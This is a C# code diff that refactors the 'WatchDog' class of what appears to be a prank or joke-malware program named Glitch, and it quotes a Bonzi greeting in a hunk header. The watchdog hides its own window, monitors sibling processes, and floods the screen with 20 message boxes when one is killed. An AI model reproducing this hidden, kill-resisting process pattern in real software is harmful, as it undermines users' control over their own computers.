@@ -6,9 +6,8 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using CC_Functions.W32;
-using GlitchPayloads;
 
-namespace Glitch
+namespace Misc
 {
     public static class WatchDog
     {
@@ -46,6 +45,7 @@ Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!
 
         public static void Run()
         {
+            Random rnd = new Random();
             Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
             Thread.Sleep(5000);
             string modN = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName);
@@ -53,10 +53,7 @@ Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!
                 if (Process.GetProcessesByName(modN).Length != WDC + 1)
                 {
                     for (int i = 0; i < 20; i++)
-                        Task.Run(() =>
-                        {
-                            MessageBox.Show(KillMessagesArr[Common.Rnd.Next(0, KillMessagesArr.Length)]);
-                        });
+                        Task.Run(() => { MessageBox.Show(KillMessagesArr[rnd.Next(0, KillMessagesArr.Length)]); });
                     Thread.Sleep(4000);
 #if DEBUG
                     Process[] p = Process.GetProcessesByName(modN);
